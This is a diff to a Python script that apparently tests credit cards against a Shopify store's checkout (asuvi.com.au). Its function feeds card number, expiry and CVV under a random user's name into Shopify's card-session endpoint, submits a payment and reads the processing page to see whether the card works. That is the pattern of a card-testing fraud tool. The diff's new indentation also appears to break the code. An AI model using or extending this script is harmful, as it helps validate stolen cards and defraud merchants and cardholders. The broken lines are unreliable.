@@ -113,51 +113,49 @@ def two(r,url,auth_token, rand_user):
 
 def three(r, payment_gateway, lista, rand_user,auth_token, url):
     cc,mes,ano,cvv = lista
-    json_four = {
-    "credit_card": {
-        "number": cc,
-        "name": rand_user.name,
-        "month": mes,
-        "year": ano,
-        "verification_value": cvv
-    },
-    "payment_session_scope": "asuvi.com.au"
-}
+        json_four = {
+        "credit_card": {
+            "number": cc,
+            "name": rand_user.name,
+            "month": mes,
+            "year": ano,
+            "verification_value": cvv
+        },
+        "payment_session_scope": "asuvi.com.au"
+    }
 
     four = r.post('https://deposit.us.shopifycs.com/sessions', json = json_four)
     if 'id' not in four.json(): return False
-    g_data = {
-'_method': 'patch',
-'authenticity_token': auth_token,
-'previous_step': 'payment_method',
-'step': '',
-'s': four.json()['id'],
-'checkout[payment_gateway]': payment_gateway,
-'checkout[credit_card][vault]': 'false',
-'checkout[different_billing_address]': 'false',
-'checkout[remember_me]': 'false',
-'checkout[remember_me]': '0',
-'checkout[vault_phone]': '',
-'checkout[total_price]': '1850',
-'complete': '1',
-'checkout[client_details][browser_width]': '615',
-'checkout[client_details][browser_height]': '667',
-'checkout[client_details][javascript_enabled]': '1',
-'checkout[client_details][color_depth]': '24',
-'checkout[client_details][java_enabled]': 'false',
-'checkout[client_details][browser_tz]': '-330',
-}
+        g_data = {
+    '_method': 'patch',
+    'authenticity_token': auth_token,
+    'previous_step': 'payment_method',
+    'step': '',
+    's': four.json()['id'],
+    'checkout[payment_gateway]': payment_gateway,
+    'checkout[credit_card][vault]': 'false',
+    'checkout[different_billing_address]': 'false',
+    'checkout[remember_me]': 'false',
+    'checkout[remember_me]': '0',
+    'checkout[vault_phone]': '',
+    'checkout[total_price]': '1850',
+    'complete': '1',
+    'checkout[client_details][browser_width]': '615',
+    'checkout[client_details][browser_height]': '667',
+    'checkout[client_details][javascript_enabled]': '1',
+    'checkout[client_details][color_depth]': '24',
+    'checkout[client_details][java_enabled]': 'false',
+    'checkout[client_details][browser_tz]': '-330',
+    }
     g = r.post(url, data = g_data)
     if g.status_code != 200:
         return False
     time.sleep(4)
-    h = r.get(g.url + '?from_processing_page=1')
+    h = r.get(f'{g.url}?from_processing_page=1')
     if h.status_code != 200:
         return False
-    i = r.get(h.url + '&validate=true')
-    if i.status_code != 200:
-        return False
-    return i.text
+    i = r.get(f'{h.url}&validate=true')
+    return False if i.status_code != 200 else i.text
 
 
 
